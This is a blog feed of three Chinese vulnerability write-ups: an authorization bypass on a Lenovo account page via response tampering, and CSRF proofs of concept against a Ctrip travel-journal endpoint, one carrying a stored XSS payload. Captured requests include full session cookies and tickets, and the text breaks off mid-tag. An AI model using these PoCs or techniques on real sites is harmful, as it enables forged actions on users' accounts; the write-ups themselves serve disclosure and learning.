<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Cai_Team</title>
  
  <subtitle>十年寒窗如一日，一举成名天下知</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="127.0.0.1/"/>
  <updated>2018-06-22T08:36:08.747Z</updated>
  <id>127.0.0.1/</id>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>漏洞挖掘经验|联想商城某处存在ID越权授权</title>
    <link href="127.0.0.1/2018/06/22/%E8%81%94%E6%83%B3%E5%95%86%E5%9F%8E%E6%9F%90%E5%A4%84%E5%AD%98%E5%9C%A8ID%E8%B6%8A%E6%9D%83%E6%8E%88%E6%9D%83/"/>
    <id>127.0.0.1/2018/06/22/联想商城某处存在ID越权授权/</id>
    <published>2018-06-22T08:29:07.000Z</published>
    <updated>2018-06-22T08:36:08.747Z</updated>
    
    <content type="html"><![CDATA[<blockquote class="blockquote-center"><p>内部文章，禁止转载！</p></blockquote><a id="more"></a><p>漏洞URL：<a href="https://account.lenovo.com/us/zh/requestaccess" target="_blank" rel="noopener">https://account.lenovo.com/us/zh/requestaccess</a></p><h5 id="我们需要注册一个账号，然后进入上述漏洞网址-如图"><a href="#我们需要注册一个账号，然后进入上述漏洞网址-如图" class="headerlink" title="我们需要注册一个账号，然后进入上述漏洞网址,如图"></a>我们需要注册一个账号，然后进入上述漏洞网址,如图</h5><p><img src="http://static.zybuluo.com/1kbfree/2qy45ucvnlrwvwhrz28dbc14/image_1cgj98rg81a4vmtlmko15kb1il629.png" alt="image_1cgj98rg81a4vmtlmko15kb1il629.png-297.2kB"></p><h5 id="我们在这里我们随便输入BID，然后用burp抓包。"><a href="#我们在这里我们随便输入BID，然后用burp抓包。" class="headerlink" title="我们在这里我们随便输入BID，然后用burp抓包。"></a>我们在这里我们随便输入BID，然后用burp抓包。</h5><p><img src="http://static.zybuluo.com/1kbfree/8j11jhnhht9n06eqmt0jq1fd/1.png" alt="1.png">  </p><h5 id="抓取返回包。"><a href="#抓取返回包。" class="headerlink" title="抓取返回包。"></a>抓取返回包。</h5><p><img src="http://static.zybuluo.com/1kbfree/flxct6ouz7h064rteflwdbat/2.png" alt="2.png">  </p><h5 id="把参数Statecode-1改为statecode-1"><a href="#把参数Statecode-1改为statecode-1" class="headerlink" title="把参数Statecode=-1改为statecode=1"></a>把参数<code>Statecode=-1</code>改为<code>statecode=1</code></h5><p><img src="http://static.zybuluo.com/1kbfree/06vpr3qdsuiptv91nanqzobs/3.png" alt="3.png">  </p><h5 id="Forward放包"><a href="#Forward放包" class="headerlink" title="Forward放包"></a>Forward放包</h5><p><img src="http://static.zybuluo.com/1kbfree/ftydy0bne3c7inrw1j6kfyfr/4.png" alt="4.png">  </p><p><em>这样的话无论我们输入BID为何值都没有用了，因为已经显示 <code>ID is already authorized</code> ，意思为该ID已经被授权。</em></p><blockquote><p>这个漏洞最主要的就是授权的时候只判断了 <code>ID</code> 的返回结果，所以导致了 <code>越权漏洞</code> 的参数</p></blockquote><p>这里吐槽一下，联想审核的第一次拒绝了我，然后我申诉，给我过了，我以为是个高危，没想到审核说<strong>越权行为已经确认产生，但是越权产生的危害不能确认，因此判定为越权行为为中风险</strong>，有点扎心</p><blockquote class="blockquote-center"><p>十年寒窗无人问，一举成名天下知<br>                            – Cai_Team</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;blockquote class=&quot;blockquote-center&quot;&gt;&lt;p&gt;内部文章，禁止转载！&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="内部资料" scheme="127.0.0.1/categories/%E5%86%85%E9%83%A8%E8%B5%84%E6%96%99/"/>
    
      <category term="Web攻防" scheme="127.0.0.1/categories/%E5%86%85%E9%83%A8%E8%B5%84%E6%96%99/Web%E6%94%BB%E9%98%B2/"/>
    
      <category term="作者：一条快乐的咸鱼" scheme="127.0.0.1/categories/%E5%86%85%E9%83%A8%E8%B5%84%E6%96%99/Web%E6%94%BB%E9%98%B2/%E4%BD%9C%E8%80%85%EF%BC%9A%E4%B8%80%E6%9D%A1%E5%BF%AB%E4%B9%90%E7%9A%84%E5%92%B8%E9%B1%BC/"/>
    
    
      <category term="漏洞挖掘" scheme="127.0.0.1/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
      <category term="越权漏洞" scheme="127.0.0.1/tags/%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="实战渗透" scheme="127.0.0.1/tags/%E5%AE%9E%E6%88%98%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>携程发游记处存在Csrf+存储Xss漏洞</title>
    <link href="127.0.0.1/2018/06/21/%E6%90%BA%E7%A8%8B%E5%8F%91%E6%B8%B8%E8%AE%B0%E5%A4%84%E5%AD%98%E5%9C%A8Csrf-%E5%AD%98%E5%82%A8Xss%E6%BC%8F%E6%B4%9E/"/>
    <id>127.0.0.1/2018/06/21/携程发游记处存在Csrf-存储Xss漏洞/</id>
    <published>2018-06-21T12:48:33.000Z</published>
    <updated>2018-06-21T16:15:07.711Z</updated>
    
    <content type="html"><![CDATA[<blockquote class="blockquote-center"><p>声明：内部文章,禁止转载!</p><p>继上篇 <code>携程某处存在Json格式的Csrf漏洞发游记</code> 写完后，又挖到一个 <code>Xss</code> (某大佬提醒的),然后造成了组合拳~</p></blockquote><a id="more"></a><blockquote><p>URL -&gt; <a href="http://you.ctrip.com/members/47A3D55C158041BD8D7F21A7BA084AA1/journals" target="_blank" rel="noopener">http://you.ctrip.com/members/47A3D55C158041BD8D7F21A7BA084AA1/journals</a></p></blockquote><h4 id="打开URL后，页面如图"><a href="#打开URL后，页面如图" class="headerlink" title="打开URL后，页面如图"></a>打开URL后，页面如图</h4><p><img src="http://static.zybuluo.com/1kbfree/al09v6gv8wew83rdl4wldxu2/image_1cgh4l305int10hdkfn1pfh4489.png" alt="image_1cgh4l305int10hdkfn1pfh4489.png-483.5kB"></p><h4 id="点击上图的写游记"><a href="#点击上图的写游记" class="headerlink" title="点击上图的写游记"></a>点击上图的写游记</h4><p><img src="http://static.zybuluo.com/1kbfree/j11j045f8xz72nmpw04kvvrd/image_1cggtlmfhq3l50r8in147aifum.png" alt="image_1cggtlmfhq3l50r8in147aifum.png-146.8kB"><br><em>点击后会进入另一个页面，如下图</em></p><h4 id="点击发布"><a href="#点击发布" class="headerlink" title="点击发布"></a>点击发布</h4><p><img src="http://static.zybuluo.com/1kbfree/7md936r409zlyh8ss369f99o/image_1cggtnrtg4h315d2174oi771rm413.png" alt="image_1cggtnrtg4h315d2174oi771rm413.png-80.9kB"><br><em>又又又还有一个页面</em></p><h4 id="选好后点击提交并且抓包"><a href="#选好后点击提交并且抓包" class="headerlink" title="选好后点击提交并且抓包"></a>选好后点击提交并且抓包</h4><p><img src="http://static.zybuluo.com/1kbfree/otd02a8z2x31i1j2udrolgco/image_1cggtquogas41v4c7keeju1p7p1g.png" alt="image_1cggtquogas41v4c7keeju1p7p1g.png-99.4kB"></p><p>抓取的数据包如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /TravelSite/Member/SaveNewTravel HTTP/1.1</span><br><span class="line">Host: you.ctrip.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0</span><br><span class="line">Accept: application/json, text/javascript, */*; q=0.01</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">DNT: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Referer: http://you.ctrip.com/TravelSite/Member/EditNewTravel?travelId=3689502</span><br><span class="line">Content-Length: 508</span><br><span class="line">Cookie: _bfa=1.1529559162771.3aowri.1.1529564159709.1529575803710.3.139; adscityen=Meizhou; _RF1=120.239.228.99; _RSG=T6KJObxFMeEUqcn7NtwLW8; _RDG=2885568a6cac882bb818690bc2de21a339; _RGUID=ea163fb9-584d-419d-8815-eb75c7c66d1e; _jzqco=%7C%7C%7C%7C1529559191059%7C1.113394883.1529559190871.1529579192824.1529579227556.1529579192824.1529579227556.undefined.0.0.31.31; __zpspc=9.3.1529576375.1529579227.12%234%7C%7C%7C%7C%7C%23; MKT_Pagesource=PC; _bfi=p1%3D290606%26p2%3D290606%26v1%3D139%26v2%3D137; login_uid=92A18FCF669DF32698BF54DD2CE7E1D1; login_type=0; UUID=1508E76B015E4E609698BCA0B9CA2320; IsPersonalizedLogin=T; appFloatCnt=1; manualclose=1; ASP.NET_SessionSvc=MTAuOC4xODkuNjB8OTA5MHxqaW5xaWFvfGRlZmF1bHR8MTUyNjUzNzExNDI2Mw; bdshare_firstime=1529559824392; _abtest_userid=a62eb7c0-4054-48fa-8421-eaae213957d6; ASP.NET_SessionId=tcktpejhlxfokmlnf1q1zn3j; _bfs=1.41; cticket=1C81168DBA3550FFB18DE9387721086ADC29F177C61F3FCDDEC332A0F561FEA1; ticket_ctrip=bJ9RlCHVwlu1ZjyusRi+ypZ7X2r4+yojO82DkiXyGYeP0Mg96gJEQ+LWMo18plOrPdkAeXYih6tqb1Y94QwsvBuemHYmTAK0dmQ8i4jhcqKgOgeTp2vPOL0poU5JHB7aZMn8dLj1VWnc06YYBrgW94hk8E69pgP+7xG9aEMLIjSajqQw9nQHaiqeULn6n6AWdH6Nx5wwmPYV+vaMlu4TmQRy40no+qH6nW0v79DvqWom85pWMuKY4cNlH+KZ0DFagL1nXMWbTg4m8Yq5UtJ0aAvGpE4MsXq6PXfRNy1Vkmc=; AHeadUserInfo=VipGrade=0&amp;UserName=&amp;NoReadMessageCount=0; DUID=u=08F36DBB6DC5886589DDBB5100AD9461&amp;v=0; IsNonUser=F</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&#123;&quot;Content&quot;:&quot;&lt;p&gt;1111111111&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br/&gt;&lt;/p&gt;&quot;,&quot;Title&quot;:&quot;11111&quot;,&quot;UploadPicContent&quot;:&quot;&quot;,&quot;CoverImageId&quot;:0,&quot;TravelId&quot;:&quot;3689502&quot;,&quot;CoverLocationY&quot;:0,&quot;ClassifiedInfo&quot;:&#123;&quot;DistrictList&quot;:[&#123;&quot;DistrictId&quot;:&quot;110000&quot;,&quot;DistrictName&quot;:&quot;ä¸­å½ï¼äºæ´²&quot;,&quot;IsSelected&quot;:true&#125;,&#123;&quot;DistrictId&quot;:&quot;1&quot;,&quot;DistrictName&quot;:&quot;111111&gt;&quot;,&quot;IsSelected&quot;:true&#125;],&quot;TagList&quot;:[],&quot;TravelId&quot;:&quot;3689502&quot;,&quot;ClassifiedType&quot;:6,&quot;TravelDays&quot;:1111111111,&quot;DepartureDate&quot;:&quot;2018-06-13&quot;,&quot;Consume&quot;:111,&quot;CompanionType&quot;:1&#125;,&quot;PublishStatus&quot;:1&#125;</span><br></pre></td></tr></table></figure></p><p><em>可以看到这里是由 <code>Json</code> 传递的，并且没有 <code>Token</code> 之类的验证，那么就可能会存在 <code>Csrf</code></em> </p><h4 id="我们将其构造成-Csrf-Poc-这里还存在存储Xss，打包在如下POC"><a href="#我们将其构造成-Csrf-Poc-这里还存在存储Xss，打包在如下POC" class="headerlink" title="我们将其构造成 Csrf Poc,这里还存在存储Xss，打包在如下POC:"></a>我们将其构造成 <code>Csrf Poc</code>,这里还存在<code>存储Xss</code>，打包在如下<code>POC</code>:</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">history.pushState('', '', '/');</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://you.ctrip.com/TravelSite/Member/SaveNewTravel"</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">enctype</span>=<span class="string">"text/plain"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">'&#123;"Content":"&lt;h1&gt;test&lt;/h1&gt;&lt;img src=x onerror=alert(\"cookie\")&gt;","UploadPicContent":"","CoverImageId":0,"TravelId":"3689502","CoverLocationY":0,"ClassifiedInfo":&#123;"DistrictList":[&#123;"DistrictId":"110000","DistrictName":"涓浗锛屼簹娲�","IsSelected":true&#125;,&#123;"DistrictId":"1","DistrictName":"111111&gt;","IsSelected":true&#125;],"TagList":[],"TravelId":"3689502","ClassifiedType":6,"TravelDays":1111111111,"DepartureDate":"2018-06-13","Consume":111,"CompanionType":10&#125;,"PublishStatus":1,"Title":"love you'</span> <span class="attr">value</span>=<span class="string">'love rice"&#125;'</span> <span class="attr">type</span>=<span class="string">'hidden'</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Submit request"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="在浏览器打开此Poc"><a href="#在浏览器打开此Poc" class="headerlink" title="在浏览器打开此Poc"></a>在浏览器打开此<code>Poc</code></h4><p><img src="http://static.zybuluo.com/1kbfree/470vyzkxjxp23fyi7646hz7y/image_1cgh4r1rh15671iempn1e5312om.png" alt="image_1cgh4r1rh15671iempn1e5312om.png-33.8kB"></p><p>查看一下是否真的发布成功~</p><p><img src="http://static.zybuluo.com/1kbfree/wtblno93qds3vqfwhw3ob8zv/image_1cgh4sfstr0m12lu1tee65f1e6h2j.png" alt="image_1cgh4sfstr0m12lu1tee65f1e6h2j.png-176kB"></p><p>接着我们点击编辑，查看是否会触发<code>Xss</code></p><p><img src="http://static.zybuluo.com/1kbfree/ugellf0ep7tyrfscqchmyn4v/image_1cgh4tdcv1osnph9mhrrl14oo30.png" alt="image_1cgh4tdcv1osnph9mhrrl14oo30.png-205.2kB"></p><p>ok~</p><blockquote class="blockquote-center"><p>十年寒窗无人问，一举成名天下知<br>                            – Cai_Team</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;blockquote class=&quot;blockquote-center&quot;&gt;&lt;p&gt;声明：内部文章,禁止转载!&lt;/p&gt;
&lt;p&gt;继上篇 &lt;code&gt;携程某处存在Json格式的Csrf漏洞发游记&lt;/code&gt; 写完后，又挖到一个 &lt;code&gt;Xss&lt;/code&gt; (某大佬提醒的),然后造成了组合拳~&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Web攻防" scheme="127.0.0.1/categories/Web%E6%94%BB%E9%98%B2/"/>
    
      <category term="渗透测试" scheme="127.0.0.1/categories/Web%E6%94%BB%E9%98%B2/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="作者：Iamfree" scheme="127.0.0.1/categories/Web%E6%94%BB%E9%98%B2/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E4%BD%9C%E8%80%85%EF%BC%9AIamfree/"/>
    
    
      <category term="漏洞挖掘" scheme="127.0.0.1/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
      <category term="Json Csrf" scheme="127.0.0.1/tags/Json-Csrf/"/>
    
      <category term="存储Xss" scheme="127.0.0.1/tags/%E5%AD%98%E5%82%A8Xss/"/>
    
      <category term="Web漏洞组合拳" scheme="127.0.0.1/tags/Web%E6%BC%8F%E6%B4%9E%E7%BB%84%E5%90%88%E6%8B%B3/"/>
    
  </entry>
  
  <entry>
    <title>携程某处存在Json格式的Csrf漏洞发游记</title>
    <link href="127.0.0.1/2018/06/21/%E6%90%BA%E7%A8%8B%E6%9F%90%E5%A4%84%E5%AD%98%E5%9C%A8Csrf%E6%BC%8F%E6%B4%9E%E5%8F%91%E6%B8%B8%E8%AE%B0/"/>
    <id>127.0.0.1/2018/06/21/携程某处存在Csrf漏洞发游记/</id>
    <published>2018-06-21T11:13:28.000Z</published>
    <updated>2018-06-21T16:29:25.077Z</updated>
    
    <content type="html"><![CDATA[<blockquote class="blockquote-center"><p>内部文章，禁止转载</p></blockquote><a id="more"></a><blockquote><p>URL -&gt; <a href="http://you.ctrip.com/members/47A3D55C158041BD8D7F21A7BA084AA1/journals" target="_blank" rel="noopener">http://you.ctrip.com/members/47A3D55C158041BD8D7F21A7BA084AA1/journals</a></p></blockquote><h4 id="1-打开URL后，页面如图"><a href="#1-打开URL后，页面如图" class="headerlink" title="1. 打开URL后，页面如图"></a>1. 打开URL后，页面如图</h4><p><img src="http://static.zybuluo.com/1kbfree/p6gljipfdvxyi9nqklpfywuf/image_1cggtjqgn2r21dlc128812gu1u849.png" alt="image_1cggtjqgn2r21dlc128812gu1u849.png-358.9kB"></p><h4 id="2-点击上图的写游记"><a href="#2-点击上图的写游记" class="headerlink" title="2. 点击上图的写游记"></a>2. 点击上图的写游记</h4><p><img src="http://static.zybuluo.com/1kbfree/j11j045f8xz72nmpw04kvvrd/image_1cggtlmfhq3l50r8in147aifum.png" alt="image_1cggtlmfhq3l50r8in147aifum.png-146.8kB"><br><em>点击后会进入另一个页面，如下图</em></p><h4 id="3-点击发布"><a href="#3-点击发布" class="headerlink" title="3. 点击发布"></a>3. 点击发布</h4><p><img src="http://static.zybuluo.com/1kbfree/7md936r409zlyh8ss369f99o/image_1cggtnrtg4h315d2174oi771rm413.png" alt="image_1cggtnrtg4h315d2174oi771rm413.png-80.9kB"><br><em>又又又还有一个页面</em></p><h4 id="4-选好后点击提交并且抓包"><a href="#4-选好后点击提交并且抓包" class="headerlink" title="4. 选好后点击提交并且抓包"></a>4. 选好后点击提交并且抓包</h4><p><img src="http://static.zybuluo.com/1kbfree/otd02a8z2x31i1j2udrolgco/image_1cggtquogas41v4c7keeju1p7p1g.png" alt="image_1cggtquogas41v4c7keeju1p7p1g.png-99.4kB"></p><p>抓取的数据包如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /TravelSite/Member/SaveNewTravel HTTP/1.1</span><br><span class="line">Host: you.ctrip.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0</span><br><span class="line">Accept: application/json, text/javascript, */*; q=0.01</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">DNT: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Referer: http://you.ctrip.com/TravelSite/Member/EditNewTravel?travelId=3689394</span><br><span class="line">Content-Length: 519</span><br><span class="line">Cookie: _bfa=1.1529559162771.3aowri.1.1529564159709.1529575803710.3.105; adscityen=Meizhou; _RF1=120.239.228.99; _RSG=T6KJObxFMeEUqcn7NtwLW8; _RDG=2885568a6cac882bb818690bc2de21a339; _RGUID=ea163fb9-584d-419d-8815-eb75c7c66d1e; _jzqco=%7C%7C%7C%7C1529559191059%7C1.113394883.1529559190871.1529565815866.1529576375632.1529565815866.1529576375632.undefined.0.0.20.20; __zpspc=9.3.1529576375.1529576375.1%234%7C%7C%7C%7C%7C%23; MKT_Pagesource=PC; _bfi=p1%3D290606%26p2%3D290606%26v1%3D105%26v2%3D104; login_uid=92A18FCF669DF32698BF54DD2CE7E1D1; login_type=0; UUID=1508E76B015E4E609698BCA0B9CA2320; IsPersonalizedLogin=F; appFloatCnt=1; manualclose=1; ASP.NET_SessionSvc=MTAuOC4xODkuNjB8OTA5MHxqaW5xaWFvfGRlZmF1bHR8MTUyNjUzNzExNDI2Mw; bdshare_firstime=1529559824392; _abtest_userid=a62eb7c0-4054-48fa-8421-eaae213957d6; cticket=1C81168DBA3550FFB18DE9387721086AA1AB2E3206164EF5DE4BF207D9F2AE8E; ticket_ctrip=bJ9RlCHVwlu1ZjyusRi+ypZ7X2r4+yojO82DkiXyGYeP0Mg96gJEQ+LWMo18plOrPdkAeXYih6tqb1Y94QwsvBuemHYmTAK0dmQ8i4jhcqKYiDhbXtS6b1594tYlhp4+VrZJoGlAq59Sa38eZFCT3+EpL6sqTuRUM54pmZHcxmxbT82oGUQF+6luF9/OQHCxD8ehHHp4AyfgBbwPE8WZTr6KEJYMAnGc5VDEoyGx91d2l+3B3eOk3Y2gGeR7BJbvn2PtKP3/2CZEUX0mKtoYQ5utvxMGO5R+fKJN1MMgSTw=; AHeadUserInfo=VipGrade=0&amp;UserName=&amp;NoReadMessageCount=0; DUID=u=08F36DBB6DC5886589DDBB5100AD9461&amp;v=0; IsNonUser=F; ASP.NET_SessionId=tcktpejhlxfokmlnf1q1zn3j; _bfs=1.7</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&#123;&quot;Content&quot;:&quot;&lt;p&gt;1111111111&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br/&gt;&lt;/p&gt;&quot;,&quot;Title&quot;:&quot;11111&quot;,&quot;UploadPicContent&quot;:&quot;&quot;,&quot;CoverImageId&quot;:0,&quot;TravelId&quot;:&quot;3689394&quot;,&quot;CoverLocationY&quot;:0,&quot;ClassifiedInfo&quot;:&#123;&quot;DistrictList&quot;:[&#123;&quot;DistrictId&quot;:&quot;110000&quot;,&quot;DistrictName&quot;:&quot;ä¸­å½ï¼äºæ´²&quot;,&quot;IsSelected&quot;:true&#125;,&#123;&quot;DistrictId&quot;:&quot;1&quot;,&quot;DistrictName&quot;:&quot;åäº¬ï¼ä¸­å½&quot;,&quot;IsSelected&quot;:true&#125;],&quot;TagList&quot;:[],&quot;TravelId&quot;:&quot;3689394&quot;,&quot;ClassifiedType&quot;:6,&quot;TravelDays&quot;:1111111111111,&quot;DepartureDate&quot;:&quot;2018-06-13&quot;,&quot;Consume&quot;:111,&quot;CompanionType&quot;:1&#125;,&quot;PublishStatus&quot;:1&#125;</span><br></pre></td></tr></table></figure></p><p><em>可以看到这里是由 <code>Json</code> 传递的，并且没有 <code>Token</code> 之类的验证，那么就可能会存在 <code>Csrf</code></em> </p><h4 id="5-我们将其构造成-Csrf-Poc"><a href="#5-我们将其构造成-Csrf-Poc" class="headerlink" title="5. 我们将其构造成 Csrf Poc"></a>5. 我们将其构造成 <code>Csrf Poc</code></h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">history.pushState('', '', '/');</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://you.ctrip.com/TravelSite/Member/SaveNewTravel"</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">enctype</span>=<span class="string">"text/plain"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">'&#123;"Content":"&lt;p&gt;1111111111&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br/&gt;&lt;/p&gt;","Title":"11111","UploadPicContent":"","CoverImageId":0,"TravelId":"3689394","CoverLocationY":0,"ClassifiedInfo":&#123;"DistrictList":[&#123;"DistrictId":"110000","DistrictName":"涓浗锛屼簹娲�","IsSelected":true&#125;,&#123;"DistrictId":"1","DistrictName":"鍖椾含锛屼腑鍥�","IsSelected":true&#125;],"TagList":[],"TravelId":"3689394","ClassifiedType":6,"TravelDays":1111111111111,"DepartureDate":"2018-06-13","Consume":111,"CompanionType":1&#125;,"PublishStatus":1'</span> <span class="attr">value</span>=<span class="string">'"&#125;'</span> <span class="attr">type</span>=<span class="string">'hidden'</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Submit request"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h5 id="疑问"><a href="#疑问" class="headerlink" title="疑问"></a>疑问</h5><p>很多人会问<code>Csrf Poc</code>数据包中的如下代码是干嘛的:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;PublishStatus&quot;:1&apos; value=&apos;&quot;&#125;&apos;</span><br></pre></td></tr></table></figure></p><p>那么下面我就来解答一下~</p><h6 id="首先"><a href="#首先" class="headerlink" title="首先"></a>首先</h6><p>我们打开这个构造好的<code>Csrf Poc</code>，并且抓包。</p><p><img src="http://static.zybuluo.com/1kbfree/bg5tze0r4ilxfnyk4hx2zqs1/image_1cggulta21htoq8d1q47dqm12nc1t.png" alt="image_1cggulta21htoq8d1q47dqm12nc1t.png-161.4kB"></p><p>可以看到，这里会多出一个<code>=</code>号，这是为什么呢？我就不拐弯抹角了，看如下案例。</p><h6 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h6><p>创建一个<code>1.html</code>文件，代码如下:<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>iamfree<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"https://www.baidu.com"</span> <span class="attr">method</span>=<span class="string">"POST"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"name"</span> <span class="attr">value</span>=<span class="string">"value"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"提交"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>我们在浏览器打开这个<code>html</code>文件并且抓包~</p><p><img src="http://static.zybuluo.com/1kbfree/hzrjgza3ogjghpkbdxwlxp4a/image_1cggv215618qv1c332bsaufrse2a.png" alt="image_1cggv215618qv1c332bsaufrse2a.png-113kB"></p><blockquote><p>看到这里的 <code>=</code> 号了吗，也就是说但我们在设置一个 <code>input</code> 属性的时候,会将<code>name</code>的值和<code>value</code>的值以一个等于号的形式传递，所以说上面我们构造好的<code>Csrf Poc</code>就是为了将这个<code>=</code>号放在数据里面，否则传递的<code>Json</code>会报错~</p></blockquote><h4 id="6-浏览器处打开这个Poc"><a 